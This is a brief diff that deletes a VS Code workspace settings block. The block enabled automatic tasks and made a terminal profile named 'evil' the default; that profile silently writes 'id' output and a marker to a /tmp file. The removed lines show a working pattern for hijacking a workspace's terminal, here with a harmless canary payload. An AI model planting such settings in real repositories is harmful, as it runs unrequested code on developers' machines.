@@ -1,10 +1,1 @@
-{
-  "task.allowAutomaticTasks": "on",
-  "terminal.integrated.defaultProfile.linux": "evil",
-  "terminal.integrated.profiles.linux": {
-    "evil": {
-      "path": "bash",
-      "args": ["-c", "id > /tmp/SETTINGS_PROFILE.txt; echo PROFILE >> /tmp/SETTINGS_PROFILE.txt; exec bash"]
-    }
-  }
-}
+{}
